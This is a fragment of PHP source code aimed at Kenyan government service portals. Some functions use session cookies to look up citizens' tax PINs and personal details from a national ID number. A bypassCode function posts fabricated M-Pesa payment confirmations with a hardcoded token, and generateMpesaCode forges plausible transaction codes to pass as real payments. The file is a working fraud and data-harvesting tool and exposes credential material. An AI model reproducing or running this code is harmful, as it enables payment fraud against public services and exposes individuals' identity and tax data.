    $dt1 = str_replace('#HttpOnly_accounts.ecitizen.go.ke', '', removeAfterWord($dt1, '#HttpOnly_accounts.ecitizen.go.ke'));
    $pattern = '/\s*/m';
    $replace = '';
    $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $dt1);

    return $removedLinebaksAndWhitespace;
}



function DLFetch($user_id)
{
    $NTSA_Token = read_NTSA_automkey();
    $dt2 =   httpGet('https://ntsa.pesaflow.com/dashboard/services/apply/32', [], ['Cookie: _automzero_key=' . $NTSA_Token . ';']);
    $csrf = (new HtmlDocument())->load($dt2)->find('meta[name="csrf-token"]', 0)->content . PHP_EOL;
    $pattern = '/\s*/m';
    $replace = '';
    $csrf = preg_replace($pattern, $replace, $csrf);

    $url = 'https://ntsa.pesaflow.com/lookup-services/18/execute';
    $data = [
        'params' => [
            'id_number' => $user_id,
        ],
        'data_template_id' => '87d845f9-c187-47ff-9bd3-95d030eb9141',
        '_csrf_token' => $csrf,
    ];

    // $dt1 = json_encode($data);
    $dt1 = httpPost($url, $data, ['Cookie: _automzero_key=' . $NTSA_Token . ';']);

    return $dt1;
}

function formatArray($array, $indent = 0)
{
    $output = '';
    foreach ($array as $key => $value) {
        $output .= str_repeat(" ", $indent) . $key . ": ";
        if (is_array($value)) {
            $output .= "<br/>";
            $output .= formatArray($value, $indent + 4);
        } else {
            $output .= $value . "<br/>";
        }
    }
    return $output;
}


function endsWith($word, $ending)
{
    $length = strlen($ending);
    if ($length == 0) {
        return true;
    }
    return (substr($word, -$length) === $ending);
}



function KraNrsFetch($nid)
{
    $url = 'https://nairobiservices.go.ke/api/authentication/auth/user_info';

    $dt1 = array('id_number' => $nid);

    //*
    $dt2 = json_decode(httpPost($url, $dt1, null, null, false, true), true);
    if (isset($dt2['has_account'])) {
        if ($dt2['has_account']) {
            $nid = $dt2['data']['identity'];
            $url1 = 'https://nairobiservices.go.ke/api/authentication/auth/get_user_details/?id_number=' . $nid;
            $dt3 = json_decode(httpGet($url1, []), true);
            if (isset($dt3['data'])) {
                $kra_pin = $dt3['data']['pin_no'];
                if ($kra_pin == null) {
                    $kra_pin = 'null';
                }
            } else {
                if (isset($dt3['error'])) {
                    $error = $dt3['error'];
                } else {
                    $error = json_encode($dt3);
                }
                //echo $error;
            }
        } else {
            $nid = $dt2['data']['nid_no'];
            if (isset($dt2['data']['pin_no'])) {
                $kra_pin = $dt2['data']['pin_no'];
            } elseif (isset($dt2['data']['tax_payer_id'])) {
                $dt2_1 = getPin($dt2['data']['tax_payer_id']);
                $kra_pin = $dt2_1[$dt2['data']['tax_payer_id']];
            } else {
                $kra_pin = 'null';
            }
            if ($kra_pin == null) {
                $kra_pin = 'null';
            }
        }
        //echo $kra_pin . ' |--| ' . $nid;
    } else {
        if (isset($dt2['error'])) {
            $error = $dt2['error'];
        } else {
            $error = json_encode($dt2);
        }
        //echo $error;
    }
    if (isset($error)) {
        return ["status" => false, "error" => $error];
    } elseif ($kra_pin) {
        if (isset($dt3)) {
            $dt4 = $dt3['data'];
        } else {
            $dt4 = $dt2['data'];
        }
        return ["status" => true, "kra" => $kra_pin, "nid" => $nid, "data" => $dt4];
    }
}
function bypassCode($bypass, $billType, $code)
{

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => $bypass['url'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => '{
            "mpesadetails": {
                "FirstName": "John",
                "BillRefNumber": "'.$bypass['invoice_no'].'",
                "TransAmount": "'.$bypass['amount'].'",
                "BillType": "'.$billType.'",
                "TransChannel": "mpesa",
                "TransID": "'.$code.'"
            }
        }',
        
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/json',
            'Cookie: csrftoken=VhxuGvVHOORIaTUKOqLGfkaUUuNP8IJ6hSkEUOsMU9NFU92RnfBn4EHWOlJeBekD; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ODYzLCJzODIiLCJtb2JpbGVfbnVtYmVyIjoiMjU0NzExNTc2OTA5In0.DagH4XZzzA9tUNrZ3Ykg0zlrCEDXOzDFjes7k91yw4U'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}
function generateMpesaCode() {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $alphabet1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $alphabet2 = '1234567890';
    $code = '';
  
    // Year (Q for 2022, R for 2023, etc.)
    $currentYear = date('Y');
    $code .= $alphabet[$currentYear - 2022+16];
  
    // Month (K for November, G for July, etc.)
    $currentMonth = date('n');
    $code .= $alphabet[$currentMonth - 1];
  
    // Day (1 for 1st, 2 for 2nd, etc.)
    $currentDay = date('j');
    if ($currentDay > 9) {
        $replaceChar = $alphabet[($currentDay - 10) % 26];
        $code .= $replaceChar;
    } else {
        $code .= $currentDay;
    }
  
    /*
    // Transaction order (A for 10th, B for 11th, etc.)
    $currentTime = date('Hi');
    $transactionOrder = intval($currentTime) + 1;
    $transactionOrder %= 100; // Limit transaction order to two digits
    $transactionOrder = str_pad($transactionOrder, 2, '0', STR_PAD_LEFT); // Pad with zeros
    $code .= $transactionOrder;
    */
    $code .= $alphabet2[rand(0, strlen($alphabet2) - 1)];
  
    //*
    // Complete the remaining characters to make the code 10 characters long
    while (strlen($code) < 10) {
      $code .= $alphabet1[rand(0, strlen($alphabet1) - 1)];
    }
    //*/
  
    return $code;
  }